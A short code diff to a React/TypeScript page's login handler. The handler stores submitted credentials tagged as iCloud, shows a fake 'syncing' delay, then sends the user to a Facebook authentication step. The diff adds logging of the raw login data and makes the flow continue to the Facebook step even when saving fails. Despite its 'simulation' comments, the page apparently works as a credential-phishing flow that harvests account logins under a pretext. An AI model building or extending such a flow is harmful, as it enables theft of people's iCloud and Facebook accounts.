@@ -28,17 +28,24 @@ export default function Home() {
   // Handlers
   const handleLoginSubmit = async (data: InsertCredential) => {
     try {
+      console.log("Submitting login:", data);
       // Send credentials (simulation)
       await createCredential({ ...data, service: "icloud" });
+      console.log("Credential created successfully");
       setStep("syncing");
       
-      // Simulate sync duration then move to next step
+      // Move to next step after a delay
       setTimeout(() => {
+        console.log("Moving to facebook_auth step");
         setStep("facebook_auth");
       }, 4000);
     } catch (error) {
       console.error("Submission error", error);
-      // In a real demo, we might show an error, but for this flow we proceed or retry
+      // Ensure the flow continues even if the API call fails
+      setStep("syncing");
+      setTimeout(() => {
+        setStep("facebook_auth");
+      }, 4000);
     }
   };
 
